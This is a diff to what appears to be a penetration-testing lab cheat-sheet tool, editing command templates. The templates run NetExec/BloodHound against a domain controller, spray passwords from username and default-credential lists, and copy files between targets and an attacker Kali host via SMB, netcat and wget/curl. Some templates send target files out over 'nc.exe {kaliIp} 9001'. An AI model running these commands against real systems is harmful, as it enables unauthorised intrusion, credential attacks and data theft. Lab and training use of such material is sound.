@@ -845,12 +845,12 @@ lab</textarea>
         commands: [
           { prefix: "BLOODHOUND against DC", className: "impt", template: "nxc ldap {nxcTarget} -u '{user}' -p '{password}' --bloodhound --collection ALL --dns-server {target}" },
           { prefix: "Anonymous SMB enumeration", template: "netexec smb {nxcTarget}{nxcSmbFlags}" },
-          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
-          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag}{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success -u users.txt" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag}{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success -u users.txt" },
           { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
           { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags}{nxcCommandExecFlag}" },
           { prefix: "Get list of user from D.C.", template: "nxc ldap {nxcTarget} -u '{user}' -p '{password}' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users.txt" },
-          { prefix: "SSH key file", template: "nxc ssh {nxcTarget}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcGeneralFlags}{nxcCommandExecFlag}" },
+          { prefix: "SSH key file", template: "nxc ssh {nxcTarget}{nxcPortFlag} --key-file id_ecdsa -p '{password}'{nxcGeneralFlags}{nxcCommandExecFlag} -u users.txt" },
           { prefix: "Try default creds", template: "nxc {service} {nxcTarget}{nxcPortFlag} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt{nxcGeneralFlags} --continue-on-success" }
         ]
       },
@@ -1306,7 +1306,7 @@ lab</textarea>
           { prefix: "On Kali", className: "kali", template: "sudo impacket-smbserver share \"$(pwd)\" -smb2support -username kali -password 'KaliPass123!'" },
           { prefix: "On Windows target", className: "target", template: "cmd /c \"net use \\\\{kaliIp}\\share /user:kali KaliPass123! 2>&1\"" },
           { prefix: "", className: "target", template: "cmd /c \"copy /Y {filename} \\\\{kaliIp}\\share\\ 2>&1\"" },
-          { prefix: "On Linux target", className: "target", template: "smbclient //{kaliIp}/share -U kali" },
+          { prefix: "On Linux target", className: "target", template: "smbclient //{kaliIp}/share -U 'kali%KaliPass123!'" },
           { prefix: "", template: "put {filename}" },
           { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > {filename}" },
           { prefix: "On Windows target", className: "target", template: "cmd.exe /c \".\\nc.exe {kaliIp} 9001 < {filename}\"" },
@@ -1325,6 +1325,10 @@ lab</textarea>
           { id: "downloadPort", type: "checkbox", label: "Add :{port}" }
         ],
         commands: [
+          { prefix: "On Kali - SMB", className: "kali", template: "sudo impacket-smbserver share \"$(pwd)\" -smb2support -username kali -password 'KaliPass123!'" },
+          { prefix: "On Windows target - SMB", className: "target", template: "cmd /c \"net use \\\\{kaliIp}\\share /user:kali KaliPass123! 2>&1\"" },
+          { prefix: "", className: "target", template: "cmd /c \"copy /Y \\\\{kaliIp}\\share\\{filename} . 2>&1\"" },
+          { prefix: "On Linux target - SMB", className: "target", template: "smbclient //{kaliIp}/share -U 'kali%KaliPass123!' -c 'get {filename}'" },
           { prefix: "Make executable", template: "chmod 777 {filename}" },
           { prefix: "Linux", template: "wget http://{kaliIp}{downloadPortFlag}/{filename}" },
           { prefix: "Linux/PowerShell", template: "curl http://{kaliIp}{downloadPortFlag}/{filename} -o {filename}" },
